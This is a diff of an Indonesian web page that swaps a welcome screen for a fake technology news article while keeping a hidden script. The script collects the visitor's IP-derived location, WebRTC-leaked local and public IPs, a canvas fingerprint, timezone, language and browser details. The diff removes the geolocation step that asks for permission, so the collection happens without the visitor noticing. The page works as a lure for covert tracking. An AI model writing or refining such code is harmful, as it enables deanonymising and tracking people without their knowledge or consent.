@@ -3,13 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Halaman Selamat Datang</title>
+    <title>Berita Terkini</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
-    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full">
-        <h1 class="text-xl md:text-2xl font-bold mb-4">Selamat Datang di Situs Kami!</h1>
-        <p class="mb-4 text-sm md:text-base">Terima kasih telah mengunjungi situs kami. Silakan jelajahi konten kami!</p>
+<body class="bg-gray-100 p-4">
+    <div class="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-lg">
+        <h1 class="text-2xl md:text-3xl font-bold mb-4">Berita Terkini: Penemuan Baru di Dunia Teknologi!</h1>
+        <p class="text-sm text-gray-500 mb-4">Diterbitkan pada 17 April 2025</p>
+        <div class="prose max-w-none">
+            <p class="mb-4">Sebuah tim peneliti dari universitas ternama baru saja mengumumkan penemuan terobosan dalam teknologi kecerdasan buatan. Mereka mengklaim telah menciptakan AI yang dapat memprediksi perilaku manusia dengan akurasi hingga 95%.</p>
+            <p class="mb-4">Penemuan ini diharapkan dapat membantu berbagai industri, mulai dari kesehatan hingga pendidikan. Namun, beberapa pihak mengkhawatirkan potensi penyalahgunaan teknologi ini untuk melacak aktivitas pengguna tanpa sepengetahuan mereka.</p>
+            <p class="mb-4">Baca terus untuk mengetahui lebih lanjut tentang bagaimana teknologi ini bekerja dan apa dampaknya bagi masa depan kita.</p>
+        </div>
     </div>
 
     <script>
@@ -35,20 +40,7 @@
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const language = navigator.language;
 
-                // 3. Geolocation API (Fallback, memerlukan izin)
-                let locationData = 'Lokasi tidak diizinkan atau tidak tersedia';
-                if (navigator.geolocation) {
-                    try {
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject);
-                        });
-                        locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                    } catch (error) {
-                        console.log('Geolocation error:', error);
-                    }
-                }
-
-                // 4. WebRTC Leak (Mendapatkan IP lokal dan publik)
+                // 3. WebRTC Leak (Mendapatkan IP lokal dan publik)
                 let webrtcIps = [];
                 try {
                     const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -62,7 +54,6 @@
                         }
                     };
                     await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                    // Tunggu beberapa saat untuk mengumpulkan kandidat ICE
                     await new Promise(resolve => setTimeout(resolve, 1000));
                     rtc.close();
                 } catch (error) {
@@ -70,7 +61,7 @@
                     webrtcIps.push('Tidak tersedia');
                 }
 
-                // 5. Canvas Fingerprinting
+                // 4. Canvas Fingerprinting
                 let canvasFingerprint = 'Tidak tersedia';
                 try {
                     const canvas = document.createElement('canvas');
@@ -93,12 +84,11 @@
                     console.log('Canvas Fingerprinting error:', error);
                 }
 
-                // 6. Informasi Browser Lain
+                // 5. Informasi Browser Lain
                 const userAgent = navigator.userAgent;
-                // Perbaikan untuk platform di iOS
                 let platform = navigator.platform;
                 if (/iPhone|iPad|iPod/.test(userAgent) && !platform.includes('iPhone')) {
-                    platform = 'iPhone'; // Koreksi platform untuk iOS
+                    platform = 'iPhone';
                 }
 
                 // Kumpulkan semua data
@@ -108,7 +98,6 @@
                     country: ipData.country_name || ipData.country || 'Tidak tersedia',
                     ipLatitude: ipData.latitude || 'Tidak tersedia',
                     ipLongitude: ipData.longitude || 'Tidak tersedia',
-                    gpsLocation: locationData,
                     timezone: timezone || 'Tidak tersedia',
                     language: language || 'Tidak tersedia',
                     webrtcIps: webrtcIps.length > 0 ? webrtcIps : ['Tidak tersedia'],
